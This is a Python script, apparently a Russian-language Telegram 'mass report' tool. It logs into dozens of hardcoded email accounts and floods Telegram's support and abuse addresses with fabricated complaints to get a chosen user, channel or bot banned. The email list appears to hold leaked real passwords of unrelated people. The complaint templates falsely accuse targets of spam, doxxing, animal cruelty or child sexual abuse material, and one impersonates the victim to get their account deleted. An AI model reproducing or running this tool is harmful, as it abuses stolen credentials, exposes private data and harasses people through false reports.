import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import sys
import getpass
y = "tmd" 
x = getpass.getpass(prompt="Введите пароль: ")
if x != y:
     print("""

░██████╗░░█████╗░  ███████╗██╗░░░██╗░█████╗░██╗░░██╗
██╔════╝░██╔══██╗  ██╔════╝██║░░░██║██╔══██╗██║░██╔╝
██║░░██╗░██║░░██║  █████╗░░██║░░░██║██║░░╚═╝█████═╝░
██║░░╚██╗██║░░██║  ██╔══╝░░██║░░░██║██║░░██╗██╔═██╗░
╚██████╔╝╚█████╔╝  ██║░░░░░╚██████╔╝╚█████╔╝██║░╚██╗
░╚═════╝░░╚════╝░  ╚═╝░░░░░░╚═════╝░░╚════╝░╚═╝░░╚═╝

██╗░░░██╗░█████╗░██╗░░░██╗██████╗░░██████╗███████╗██╗░░░░░███████╗
╚██╗░██╔╝██╔══██╗██║░░░██║██╔══██╗██╔════╝██╔════╝██║░░░░░██╔════╝
░╚████╔╝░██║░░██║██║░░░██║██████╔╝╚█████╗░█████╗░░██║░░░░░█████╗░░
░░╚██╔╝░░██║░░██║██║░░░██║██╔══██╗░╚═══██╗██╔══╝░░██║░░░░░██╔══╝░░
░░░██║░░░╚█████╔╝╚██████╔╝██║░░██║██████╔╝███████╗███████╗██║░░░░░
░░░╚═╝░░░░╚════╝░░╚═════╝░╚═╝░░╚═╝╚═════╝░╚══════╝╚══════╝╚═╝░░░░░

     
     """)
     time.sleep(2)
     sys.exit(1)
else:
     print("Пароль верен")
senders = {
'knocrufridunringgent@mail.ru': 'dn333DbbuEfGnqw08Rxm',
'tworensodiapansaa@mail.ru': 'dsGajJE1TtiAGgZsgyvQ',
'korlithiobtennick@mail.ru': 'feDLSiueGT89APb81v74',
'tioreibunthandvahear@mail.ru': 'ggKygTjxSLzwm4tWd43B',
'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
'aria.therese.svensson@mail.com': 'Zorro1ab',
'taterbug@verizon.net': 'Holly1!',
'ejbrickner@comcast.net': 'Pass1178',
'teressapeart@cox.net': 'Quinton2329!',
'liznees@verizon.net': 'Dancer008',
'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
'kcdg@charter.net': 'Jennifer3*',
'bean_118@hotmail.com': 'Liverpool118!',
'dsdhjas@mail.com': 'LONGHACH123',
'robitwins@comcast.net': 'May241996',
'wasina@live.com': 'Marlas21',
'aruzhan.01@mail.com': '1234567!',
'HighEndurance4li@yahoo.com': 'erfgthyjklatomSnos.py',
'korlithiobtennick@mail.ru': 'feDLSiueGT89APb81v74',
'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
'aria.therese.svensson@mail.com': 'Zorro1ab',
'taterbug@verizon.net': 'Holly1!',
'ejbrickner@comcast.net': 'Pass1178',
'teressapeart@cox.net': 'Quinton2329!',
'liznees@verizon.net': 'Dancer008',
'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
'kcdg@charter.net': 'Jennifer3*',
'bean_118@hotmail.com': 'Liverpool118!',
'dsdhjas@mail.com': 'LONGHACH123',
'robitwins@comcast.net': 'May241996',
'wasina@live.com': 'Marlas21',
'aruzhan.01@mail.com': '1234567!',
'rob.tackett@live.com': 'metallic',
'lindahallenbeck@verizon.net': 'Anakin@2014',
'hlaw82@mail.com': 'Snoopy37$$',
'paintmadman@comcast.net': 'mycat2200*',
'prideandjoy@verizon.net': 'Ihatejen12',
'sdgdfg56@mail.com': 'kenwood4201',
'garrett.danelz@comcast.net': 'N11golfer!',
'gillian_1211@hotmail.com': 'Gilloveu1211',
'sunpit16@hotmail.com': 'Putter34!',
'fdshelor@verizon.net': 'Masco123*',
'yeags1@cox.net': 'Zoomom1965!',
'amine002@usa.com': 'iScrRoXAei123',
'bbarcelo16@cox.net': 'Bsb161089$$',
'laliebert@hotmail.com': 'pirates2',
'vallen285@comcast.net': 'Delft285!1!',
'sierra12@email.com': 'tegen1111',
'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
'kmay@windstream.net': 'Nascar98',
'redbrick1@mail.com': 'Redbrick11',
'ivv9ah7f@mail.com': 'K226nw8duwg',
'erkobir@live.com': 'floydLAWTON019',
'Misscarter@mail.com': 'ashtray19',
'carlieruby10@cox.net': 'Lollypop789$',
'blackops2013@mail.com': 'amason123566',
'caroline_cullum@comcast.net': 'carter14',
'dpb13@live.com': 'Ic&ynum13',
'heirhunter@usa.com': 'Noguys@714',
'sherri.edwards@verizon.net': 'Dreaming123#',
'rami.rami1980@hotmail.com': 'ramirami1980',
'jmsingleton2@comcast.net': '151728Jn$$',
'aberancho@aol.com': '10diegguuss10',
'dgidel@iowatelecom.net': 'Buster48',
'gpopandopul@mail.com': 'GEORG62A',
'bolgodonsk@mail.com': '012345678!',
'colbycolb@cox.net': 'Signals@1',
'nicrey4@comcast.net': 'Dabears54',
'mordechai@mail.com': 'Mordechai',
'inemrzoya@mail.com': 'rLS1elaUrLS1elaU',
'tarabedford@comcast.net': 'Money4me',
'mycockneedsit@mail.com': 'benjamin3',
'saralaine@mail.com': 'sarlaine12!1',
'jonb2006@verizon.net': '1969Camaro',
'rjhssa1@verizon.net': 'Donna613*',
'cameron.doug@charter.net': 'Jake2122$',
'bridget.shappell@comcast.net': 'Brennan1',
'rugs8@comcast.net': 'baseball46',
'averyjacobs3@mail.com': '1960682644!',
'lstefanick@hotmail.com': 'Luv2dance2',
'bchavez123@mail.com': 'aadrianachavez',
'lukejamesjones@mail.com': 'tinkerbell1',
'emahoney123@comcast.net': 'Shieknmme3#',
'mandy10.mcevoy@btinternet.com': 'Tr1plets3',
'jet747@cox.net': 'Sadie@1234',
'landsgascareservices@mail.com': 'Alisha25@',
'samantha224@mail.com': 'Madden098!@',
'kbhamil@wowway.com': 'Carol1940',
'email@bjasper.com': 'Lhsnh4us123!',
'biggsbrian@cox.net': 'Trains@2247Trains@2247',
'dzzeblnd@aol.com': 'Geosgal@1',
'jtrego@indy.rr.com': 'Jackwill14!',
'chrisphonte.rj@comcast.net': 'Junior@3311',
'tvwifiguy@comcast.net': 'Bill#0101',
'defenestrador@mail.com': 'm0rb1d8ss',
'glangley@gmx.com': 'ironhide',
'charlotte2850@hotmail.com': 'kelalu2850',
'darkice_05@yahoo.com':'kentik332',
'harrybattaglia@hotmail.com':'pipuka45',
'pecardosoa@hotmail.com':'sosotwrp22',
'ghazz72@yahoo.com':'Kevin66',
'erxcool@hot.ee':'Anton565pip',
'longsword72@hotmail.com':'OnToSheChKa11',
'anggataulagi@gmail.com':'popolovnik',
'rzhen1228@yahoo.com':'blbyf[eq46',
'ckenworthy1986@hotail.com':'Jojofan55',
'@hotmail.com':'dodgemesa92',
'yahoo.co.uk':'poopaman',
'poopaman@hotmail.co.uk':'hammerquist',
'armand-college@webmail.co.za':'pspfrank',
'yahoo.ca':'vandrmoore',
'kenneth_malmo@hotmail.com':'alexander',
'bluewin.ch':'mulla_uk1',
'aol.com':'cap54',
'floydpublications.com':'jakeispimp123',
'bu buzo_mpb@hotmail.com':'pecardosoa',
'digital-design@hotmail.it':'sead_rastoder',
't-2.net':'cloudstrife_ff90',
'gc@gmail.com':'edithlaclair',
'yahoo.co.uk':'kellie_delahuliniere',
'nvannoy@gmail.com':'ronaldzhen',
'kit84@hotmail.com':'henchman_2',
'hotmail.co.uk':'diogenis75',
'yahoo.com':'alexdanem',
'abetalasf@gmail.com':'artofoflylife',
'yahoo.com.au':'r0d56',
'llogie2004@hotmail.com':'chen.shiliang',
'bilal_247@hotmail.com':'jshurley04',
'pnwmortgage.com':'harrison',
'hotmail.com':'keshow_007',
'hotmail.com':'angelo_saad',
'hotmail.com':'john1-6-3',
'yahoo.com':'honeyjuggler',
'campus.citytech.cuny.edu':'nnikitin',
'us.army.mil':'charles.brennan',
'yahoo.com':'buffalomba',
'yahoo.com':'mamabear7836',
'yahoo.com':'cybertj_2000',
'yahoo.co.jp':'tengawan',
'die-aues.de':'michi',
'eircom.net':'y2stevo',
'live.com':'simcic',
'hotmail.com':'dominicmiles',
'hotmail.com':'supermelann',
'live.com':'wossa',
'hot.ee':'erxcool',
'yahoo.com':'love2sk806',
'hotmail.com':'pierreetienne.cote',
'hotmail.com':'ma_forest',
'hotmail.com':'demonslayer3691',
'yahoo.com':'bboyjuice',
'yahoo.com':'kingselasseidubz',
'yahoo.com':'renan_macapinlac',
'qcislands.net':'mentir',
'hotmail.com':'resistence',
'hotmail.com':'longsword72',
'yahoo.com':'masssia',
'us.army.mil':'charles.brennan',
'buffalomba@yahoo.com':'charles.brennan',
'aol.com':'buffalomba'
}
receivers = ['sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
             'sticker@telegram.org', 'support@telegram.org']

def logo():
    
    print("TGKILL")
    print("BY: @Y0UR_DEATH88")
    print("""
                                                                                                        
     ███     ███ ███       ████    ███████   ██████ ████████ ██        ████  ███    ███ █████████     
      ███    ███ ███      ██████   ██   ████  ███  ███    ██ ██       █████  ███    ███ ███           
      ███   ███  ███      ██████   ██     ███ ███  █████     ██      ███████  ███  ███  █████████     
       ███████   ███     ███ ████  ██     ███ ███    ███████ ██     ████  ███  ██████   █████████     
       ███████   ███     █████████ ██     ███ ███        ███ ██     █████████  ██████   ███           
        █████    ███    ███    ███ ██ ██████  ███  ███   ███ ██    ████    ███  ████    ███           
         ███     █████████      █████████    ██████ ███████  █████████     ███  ████    █████████     
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                  ████████  █████████   ████████ ██████████                           
                                  ███    █ ███    ████  ██          ███                               
                                  █████    ███      ███ ████████    ███                               
                                    ██████ ███      ███ ██          ███                               
                                        ██ ████     ███ ██          ███                               
                                  ████████ ██████████   ██          ███                               
                                   █████      █████                                                 
                                                                                                    
                                                                                                    
    
          """)
    print("ㅤ")


def menu():
    print("1. Снос ТГ.")
    print("ㅤ")
    print("2. Снос ТГК.")
    print("ㅤ")
    print("3. Aвтор проекта.")
    print("ㅤ")
    print("4. Снос бота.")
    print("ㅤ")
    print("ㅤ")
    print("ㅤ")
    print("ㅤ")
    
    
    
    choice = input("Выбирай броу: ")
    return choice
def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP('smtp.mail.ru', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        time.sleep(3)
        server.quit()
        return True
    except Exception as e:
        return False

def main():
    sent_emails = 0
    logo()
    choice = menu()

    if choice == '1':
        print("1. СНОСИНГ.")
        print("2. ДОКСUHG.")
        print("3. ТРОЛЛЕНГ.")
        print("4. СНОС СЕССИЙ.")
        print("5. С премкой")
        print("6. С вирт номером.")
        print("7. Детское")
        print("8. Восстановка")
        comp_choice = input("Выбирай броу: ")

        if comp_choice in ["1", "2", "3"]:
            print("Следуй указаниям.")
            username = input("юзер: ")
            id = input("айди: ")
            chat_link = input("ссылку на чат: ")
            violation_link = input("ссылку на нарушение: ")
            print("подожди 3 секунды.")
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка. На вашей платформе я нашел пользователя который отправляет много ненужных сообщений - СПАМ. Его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю.",
                "2": f"Здравствуйте, уважаемая поддержка, на вашей платформе я нашел пользователя, который распространяет чужие данные без их согласия. его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его акккаунта.",
                "3": f"Здравствуйте, уважаемая поддержка телеграм. Я нашел пользователя который открыто выражается нецензурной лексикой и спамит в чатах. его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его акккаунта."
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip(), chat_link=chat_link.strip(),
                                                 violation_link=violation_link.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на аккаунт телеграм', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 14888
                    time.sleep(5)

        elif comp_choice == "4":
            print("следуй указаниям.")
            username = input("юзернейм: ")
            id = input("айди: ")
            print("подожди 3 секунды.")
            comp_texts = {
                "4": f"Здравствуйте, уважаемая поддержка. Я случайно перешел по фишинговой ссылке и утерял доступ к своему аккаунту. Его юзернейм - {username}, его айди - {id}. Пожалуйста удалите аккаунт или обнулите сессии"
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip())
                    send_email(receiver, sender_email, sender_password, 'Я утерял свой аккаунт в телеграм', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 14888
                    time.sleep(5)

        elif comp_choice == ["5", "6"]:
            print("следуй указаниям")
            username = input("юзернейм: ")
            id = input("айди: ")
            comp_texts = {
                "5": f"Добрый день поддержка Telegram!Аккаунт {username} , {id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться.Прошу разберитесь с этим. Заранее спасибо!",
                "6": f"Добрый день поддержка Telegram! Аккаунт {username} {id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram.Прошу проверить данную жалобу и принять меры!"
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на пользователя телеграм', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 9999
                    time.sleep(5)
    
        elif comp_choice == ["7"]:
            print("Следуй указаниям")
            username = input("Юзернейм:")
            id = input("Айди:")
            comp_texts = {
                "7": f"Добрый день поддержка Telegram!Аккаунт {username} , {id} распространяет порнографию с участием несовершеннолетих, просьба принять меры в виде блокировки аккаунта.Заранее болльшое спасибо"
           } 
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на пользователя телеграм', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 9999
                    time.sleep(5)
        elif comp_choice in ["8"]:
            print("следуй указаниям")
            username = input("юзернейм: ")
            id = input("айди: ")
            numb = input("Номер c плюсом:")
            comp_texts = { 
                "8": f"Здравствуйте уважаемая поддержка телеграмм! Мой аккаунт {username} , {id} , {numb} Заблокировали по ошибке! Дело в том что я живу в россии и жители украины специально кидают жалобы с целью заблокировать мой аккаунт просто так (это изза войны) лично я не поддерживаю войну и я за мир. Прошу принять меры. До свидания уважаемые агенты и поддержка телеграмм!"
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на пользователя телеграм', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 9999
                    time.sleep(5)

    elif choice == "2":
        
        print("1. с личными данными.")
        print("2. с живодерством.")
        print("3. с цп.")
        print("4. для каналов типа прайсов.")
        ch_choice = input("выбор: ")

        if ch_choice in ["1", "2", "3", "4"]:
            channel_link = input("ссылка на канал: ")
            channel_violation = input("ссылка на нарушение (в канале): ")
            print("подожди 3 секунды.")
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел канал, который распространяет личные данные невинных людей. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "2": f"Здравствуйте, уважаемая поддержка телеграма. На вашей платформе я нашел канал который распространяет жестокое обращение с животными. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "3": f"Здравствуйте, уважаемая поддержка телеграма. На вашей платформе я нашел канал который распространяет порнографию с участием несовершеннолетних. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "4": f"Здравствуйте,уважаемый модератор телеграмм,хочу пожаловаться вам на канал,который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал:{channel_link} Ссылка на нарушение:{channel_violation} Просьба заблокировать данный канал."
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[ch_choice]
                    comp_body = comp_text.format(channel_link=channel_link.strip(), channel_violation=channel_violation.strip)
                    send_email(receiver, sender_email, sender_password, 'Жалоба на телеграм канал', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 100000
                    time.sleep(5)

    elif choice == "3":
        print("Telegram: @Y0UR_DEATH88")

    elif choice == "4":
        print("1. бот")
        print("2. Пока не придумали")
        bot_ch = input("выбора нету: ")

        if bot_ch == "1":
            bot_user = input("юз бота: ")
            print("подождите 3 секунды.")
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел бота, который осуществляет поиск по личным данным ваших пользователей. Ссылка на бота - {bot_user}. Пожалуйста разберитесь и заблокируйте данного бота."
                       }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[bot_ch]
                    comp_body = comp_text.format(bot_user=bot_user.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на бота телеграм', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 1
                    time.sleep(5)
    
        
        

  
if __name__ == "__main__":
    main()
